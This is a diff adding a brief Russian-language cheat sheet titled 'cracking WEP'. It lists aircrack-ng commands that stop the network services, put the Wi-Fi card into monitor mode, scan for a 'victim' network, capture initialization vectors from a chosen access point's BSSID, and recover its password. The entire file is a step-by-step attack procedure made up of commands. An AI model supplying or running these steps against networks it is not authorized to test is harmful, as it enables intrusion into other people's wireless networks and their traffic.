@@ -1,0 +1,32 @@
+------------------
+-- Взлом wep --
+------------------
+
+$ sudo pacman -S aircrack-ng  # установим утилиту дя взлома
+
+$ sudo iwconfig  # определим имя нашего беспроводного соединения
+
+$ sudo airmon-ng check  # смотрим что мешает нам перевести wifi в режим мониторинга. Выдаст что-то вроде этого
+
+   PID Name
+   498 NetworkManager
+   501 avahi-daemon
+   543 avahi-daemon
+   659 wpa_supplicant
+
+$ sudo systemctl stop NetworkManager  # останавливаем серсис
+
+$ sudo systemctl stop wpa_supplicant  # останавливаем серсис
+
+$ sudo systemctl stop avahi-daemon.service  # останавливаем серсис
+
+$ sudo kill ...  # убиваем процессы (название процессов)
+
+$ sudo  airmon-ng start wlan0  # переводим wifi в режим мониторинга
+
+$ sudo airodump-ng mon0  # проведем мониторинг сети и выберем жертву
+
+
+$ sudo airodump-ng mon0 --bssid 00:26:5A:6D:C9:25 -w wep --ivs.  # в результате выполнения этой команды идет перехват векторов инициализации между точкой доступа и станциями (bssid пишем адресс выбранной жерты)
+
+$ sudo aircrack-ng wep.ivs  # запускаем еще один терминал (предыдущий не закрываем. Ищем пароль
